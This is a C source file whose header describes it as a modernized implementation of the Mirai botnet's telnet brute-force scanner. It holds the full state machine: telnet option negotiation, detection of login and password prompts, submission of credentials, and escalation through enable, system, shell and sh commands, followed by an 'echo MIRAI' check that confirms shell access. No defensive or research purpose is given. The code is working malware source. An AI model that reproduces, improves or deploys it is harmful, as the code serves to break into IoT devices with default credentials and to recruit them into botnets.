/**
 * @file telnet_state_machine.c
 * @brief Full telnet state machine implementation for IoT device scanning
 * 
 * This implements the complete 11-state telnet brute-force scanner from
 * the original Mirai botnet, modernized with C17, error handling, and logging.
 * 
 * State Flow:
 * CLOSED → CONNECTING → HANDLE_IACS → WAITING_USERNAME → WAITING_PASSWORD →
 * WAITING_PASSWD_RESP → WAITING_ENABLE_RESP → WAITING_SYSTEM_RESP →
 * WAITING_SHELL_RESP → WAITING_SH_RESP → WAITING_TOKEN_RESP → Report/Close
 */

#define _GNU_SOURCE
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>

#include "telnet_state_machine.h"
#include "../common/logger.h"
#include "../common/util.h"

// Telnet protocol constants
#define TELNET_IAC  0xFF  // Interpret As Command
#define TELNET_WILL 0xFB  // Will do option
#define TELNET_WONT 0xFC  // Won't do option
#define TELNET_DO   0xFD  // Do option
#define TELNET_DONT 0xFE  // Don't do option
#define TELNET_SB   0xFA  // Subnegotiation begin
#define TELNET_SE   0xF0  // Subnegotiation end

// Buffer management
#define RDBUF_SIZE 256
#define RDBUF_DRAIN 64

/**
 * Helper: Check if we can consume 'amount' bytes from buffer
 */
static inline bool can_consume(telnet_conn_t *conn, char *ptr, int amount)
{
    char *end = conn->rdbuf + conn->rdbuf_pos;
    return (ptr + amount) < end;
}

/**
 * Helper: Strip NULL bytes from received data (some devices send them)
 */
static ssize_t recv_strip_null(int sock, void *buf, size_t len, int flags)
{
    ssize_t ret = recv(sock, buf, len, flags);
    
    if (ret > 0) {
        for (ssize_t i = 0; i < ret; i++) {
            if (((char *)buf)[i] == 0x00) {
                ((char *)buf)[i] = 'A';  // Replace NULL with 'A'
            }
        }
    }
    
    return ret;
}

/**
 * State: Handle telnet IAC (Interpret As Command) negotiations
 * 
 * Telnet protocol uses 0xFF (IAC) as escape sequence for commands.
 * We need to respond to DO/DONT/WILL/WONT negotiations.
 * 
 * @return Bytes consumed from buffer, 0 if need more data
 */
int telnet_consume_iacs(telnet_conn_t *conn)
{
    int consumed = 0;
    char *ptr = conn->rdbuf;
    
    while (consumed < conn->rdbuf_pos) {
        if (*ptr != TELNET_IAC) {
            break;  // No more IACs to process
        }
        
        // Handle IAC sequences
        if (*ptr == TELNET_IAC) {
            if (!can_consume(conn, ptr, 1)) {
                break;  // Need more data
            }
            
            // IAC IAC = escaped 0xFF literal
            if (ptr[1] == TELNET_IAC) {
                ptr += 2;
                consumed += 2;
                continue;
            }
            
            // IAC DO option (server wants us to enable option)
            if (ptr[1] == TELNET_DO) {
                if (!can_consume(conn, ptr, 2)) {
                    break;
                }
                
                // Special handling for window size negotiation (option 31)
                if (ptr[2] == 31) {
                    uint8_t will_windowsize[3] = {TELNET_IAC, TELNET_WILL, 31};
                    uint8_t sb_windowsize[9] = {
                        TELNET_IAC, TELNET_SB, 31,
                        0, 80,   // Width: 80 columns
                        0, 24,   // Height: 24 rows
                        TELNET_IAC, TELNET_SE
                    };
                    
                    send(conn->fd, will_windowsize, 3, MSG_NOSIGNAL);
                    send(conn->fd, sb_windowsize, 9, MSG_NOSIGNAL);
                    
                    ptr += 3;
                    consumed += 3;
                    continue;
                }
                
                // For other options, respond with WONT (we won't do it)
                uint8_t response[3] = {TELNET_IAC, TELNET_WONT, ptr[2]};
                send(conn->fd, response, 3, MSG_NOSIGNAL);
                
                ptr += 3;
                consumed += 3;
                continue;
            }
            
            // IAC WILL/WONT/DONT - respond with opposite
            if (ptr[1] == TELNET_WILL || ptr[1] == TELNET_WONT || ptr[1] == TELNET_DONT) {
                if (!can_consume(conn, ptr, 2)) {
                    break;
                }
                
                uint8_t response[3];
                response[0] = TELNET_IAC;
                response[1] = (ptr[1] == TELNET_DO) ? TELNET_WONT : TELNET_DONT;
                response[2] = ptr[2];
                
                send(conn->fd, response, 3, MSG_NOSIGNAL);
                
                ptr += 3;
                consumed += 3;
                continue;
            }
            
            // Unknown IAC sequence, skip it
            ptr += 2;
            consumed += 2;
        }
    }
    
    return consumed;
}

/**
 * State: Wait for username/login prompt
 * 
 * Look for common prompts:
 * - "login:" or "Login:"
 * - "enter" or "Enter"
 * - Shell prompts: :, >, $, #, %
 * 
 * @return Bytes consumed, 0 if no prompt found
 */
int telnet_consume_user_prompt(telnet_conn_t *conn)
{
    int prompt_ending = -1;
    
    // Look for shell prompt characters from end of buffer
    for (int i = conn->rdbuf_pos - 1; i > 0; i--) {
        char ch = conn->rdbuf[i];
        if (ch == ':' || ch == '>' || ch == '$' || ch == '#' || ch == '%') {
            prompt_ending = i + 1;
            break;
        }
    }
    
    // If no shell prompt, look for "login" or "enter" strings
    if (prompt_ending == -1) {
        // Search for "ogin" (matches "login" or "Login")
        for (int i = 0; i <= conn->rdbuf_pos - 4; i++) {
            if (memcmp(conn->rdbuf + i, "ogin", 4) == 0) {
                prompt_ending = i + 4;
                break;
            }
        }
        
        // Search for "enter"
        if (prompt_ending == -1) {
            for (int i = 0; i <= conn->rdbuf_pos - 5; i++) {
                if (memcmp(conn->rdbuf + i, "enter", 5) == 0) {
                    prompt_ending = i + 5;
                    break;
                }
            }
        }
    }
    
    return (prompt_ending == -1) ? 0 : prompt_ending;
}

/**
 * State: Wait for password prompt
 * 
 * Look for:
 * - "password:" or "Password:"
 * - Shell prompts: :, >, $, #
 * 
 * @return Bytes consumed, 0 if no prompt found
 */
int telnet_consume_pass_prompt(telnet_conn_t *conn)
{
    int prompt_ending = -1;
    
    // Look for shell prompt characters
    for (int i = conn->rdbuf_pos - 1; i > 0; i--) {
        char ch = conn->rdbuf[i];
        if (ch == ':' || ch == '>' || ch == '$' || ch == '#') {
            prompt_ending = i + 1;
            break;
        }
    }
    
    // Look for "assword" (matches "password" or "Password")
    if (prompt_ending == -1) {
        for (int i = 0; i <= conn->rdbuf_pos - 7; i++) {
            if (memcmp(conn->rdbuf + i, "assword", 7) == 0) {
                prompt_ending = i + 7;
                break;
            }
        }
    }
    
    return (prompt_ending == -1) ? 0 : prompt_ending;
}

/**
 * State: Wait for any shell prompt
 * 
 * Used after sending commands to detect when shell is ready.
 * 
 * @return Bytes consumed, 0 if no prompt found
 */
int telnet_consume_any_prompt(telnet_conn_t *conn)
{
    // Look for shell prompt characters from end of buffer
    for (int i = conn->rdbuf_pos - 1; i > 0; i--) {
        char ch = conn->rdbuf[i];
        if (ch == ':' || ch == '>' || ch == '$' || ch == '#' || ch == '%') {
            return i + 1;
        }
    }
    
    return 0;
}

/**
 * State: Wait for verification token response
 * 
 * Check if we received the expected token (successful login) or
 * "incorrect" message (failed login).
 * 
 * @param token Expected success token to search for
 * @param token_len Length of token
 * @param incorrect_msg Expected failure message
 * @param incorrect_len Length of failure message
 * @return Bytes consumed, 0 if waiting, -1 if login failed
 */
int telnet_consume_resp_prompt(telnet_conn_t *conn, 
                                const char *token, size_t token_len,
                                const char *incorrect_msg, size_t incorrect_len)
{
    // Check for incorrect password message
    for (int i = 0; i <= conn->rdbuf_pos - (int)incorrect_len; i++) {
        if (memcmp(conn->rdbuf + i, incorrect_msg, incorrect_len) == 0) {
            return -1;  // Login failed
        }
    }
    
    // Check for success token
    for (int i = 0; i <= conn->rdbuf_pos - (int)token_len; i++) {
        if (memcmp(conn->rdbuf + i, token, token_len) == 0) {
            return i + token_len;  // Success!
        }
    }
    
    return 0;  // Still waiting for response
}

/**
 * Process received data for a connection based on current state
 * 
 * @param conn Connection to process
 * @param creds Credentials to use
 * @return 0 = continue, 1 = success, -1 = failed
 */
int telnet_state_machine_process(telnet_conn_t *conn, const telnet_credentials_t *creds)
{
    while (true) {
        int consumed = 0;
        
        switch (conn->state) {
            case TELNET_STATE_HANDLE_IACS:
                consumed = telnet_consume_iacs(conn);
                if (consumed > 0) {
                    conn->state = TELNET_STATE_WAITING_USERNAME;
                    log_debug("Telnet negotiation complete");
                }
                break;
                
            case TELNET_STATE_WAITING_USERNAME:
                consumed = telnet_consume_user_prompt(conn);
                if (consumed > 0) {
                    send(conn->fd, creds->username, creds->username_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                    conn->state = TELNET_STATE_WAITING_PASSWORD;
                    log_debug("Sent username: %.*s", (int)creds->username_len, creds->username);
                }
                break;
                
            case TELNET_STATE_WAITING_PASSWORD:
                consumed = telnet_consume_pass_prompt(conn);
                if (consumed > 0) {
                    send(conn->fd, creds->password, creds->password_len, MSG_NOSIGNAL);
                    send(conn->fd, "\r\n", 2, MSG_NOSIGNAL);
                    conn->state = TELNET_STATE_WAITING_PASSWD_RESP;
                    log_debug("Sent password");
                }
                break;
                
            case TELNET_STATE_WAITING_PASSWD_RESP:
                consumed = telnet_consume_any_prompt(conn);
                if (consumed > 0) {
                    // Send "enable" command to try elevating privileges
                    send(conn->fd, "enable\r\n", 8, MSG_NOSIGNAL);
                    conn->state = TELNET_STATE_WAITING_ENABLE_RESP;
                    log_debug("Sent enable command");
                }
                break;
                
            case TELNET_STATE_WAITING_ENABLE_RESP:
                consumed = telnet_consume_any_prompt(conn);
                if (consumed > 0) {
                    // Send "system" command
                    send(conn->fd, "system\r\n", 8, MSG_NOSIGNAL);
                    conn->state = TELNET_STATE_WAITING_SYSTEM_RESP;
                    log_debug("Sent system command");
                }
                break;
                
            case TELNET_STATE_WAITING_SYSTEM_RESP:
                consumed = telnet_consume_any_prompt(conn);
                if (consumed > 0) {
                    // Send "shell" command
                    send(conn->fd, "shell\r\n", 7, MSG_NOSIGNAL);
                    conn->state = TELNET_STATE_WAITING_SHELL_RESP;
                    log_debug("Sent shell command");
                }
                break;
                
            case TELNET_STATE_WAITING_SHELL_RESP:
                consumed = telnet_consume_any_prompt(conn);
                if (consumed > 0) {
                    // Send "sh" command
                    send(conn->fd, "sh\r\n", 4, MSG_NOSIGNAL);
                    conn->state = TELNET_STATE_WAITING_SH_RESP;
                    log_debug("Sent sh command");
                }
                break;
                
            case TELNET_STATE_WAITING_SH_RESP:
                consumed = telnet_consume_any_prompt(conn);
                if (consumed > 0) {
                    // Send verification query
                    send(conn->fd, "echo MIRAI\r\n", 12, MSG_NOSIGNAL);
                    conn->state = TELNET_STATE_WAITING_TOKEN_RESP;
                    log_debug("Sent verification token");
                }
                break;
                
            case TELNET_STATE_WAITING_TOKEN_RESP:
                consumed = telnet_consume_resp_prompt(conn, 
                                                      "MIRAI", 5,
                                                      "incorrect", 9);
                if (consumed == -1) {
                    log_info("Login failed: incorrect credentials");
                    return -1;  // Failed
                } else if (consumed > 0) {
                    log_info("Login successful!");
                    return 1;  // Success!
                }
                break;
                
            default:
                consumed = 0;
                break;
        }
        
        // If no data consumed, we're waiting for more data
        if (consumed == 0) {
            break;
        }
        
        // Remove consumed data from buffer
        if (consumed > conn->rdbuf_pos) {
            consumed = conn->rdbuf_pos;
        }
        
        conn->rdbuf_pos -= consumed;
        memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
    }
    
    return 0;  // Continue processing
}

/**
 * Receive data into connection buffer
 * 
 * @return Bytes received, 0 on graceful close, -1 on error
 */
ssize_t telnet_receive_data(telnet_conn_t *conn)
{
    // If buffer full, drain some data
    if (conn->rdbuf_pos == RDBUF_SIZE) {
        memmove(conn->rdbuf, conn->rdbuf + RDBUF_DRAIN, RDBUF_SIZE - RDBUF_DRAIN);
        conn->rdbuf_pos -= RDBUF_DRAIN;
    }
    
    // Receive data (strips NULL bytes)
    ssize_t ret = recv_strip_null(conn->fd, 
                                   conn->rdbuf + conn->rdbuf_pos,
                                   RDBUF_SIZE - conn->rdbuf_pos,
                                   MSG_NOSIGNAL);
    
    if (ret > 0) {
        conn->rdbuf_pos += ret;
    }
    
    return ret;
}

/**
 * Initialize a new telnet connection
 */
void telnet_connection_init(telnet_conn_t *conn, int fd, uint32_t dst_addr, uint16_t dst_port)
{
    memset(conn, 0, sizeof(telnet_conn_t));
    conn->fd = fd;
    conn->dst_addr = dst_addr;
    conn->dst_port = dst_port;
    conn->state = TELNET_STATE_HANDLE_IACS;
    conn->rdbuf_pos = 0;
    conn->tries = 0;
}

/**
 * Reset connection for retry with different credentials
 */
void telnet_connection_reset(telnet_conn_t *conn)
{
    conn->state = TELNET_STATE_HANDLE_IACS;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));
}
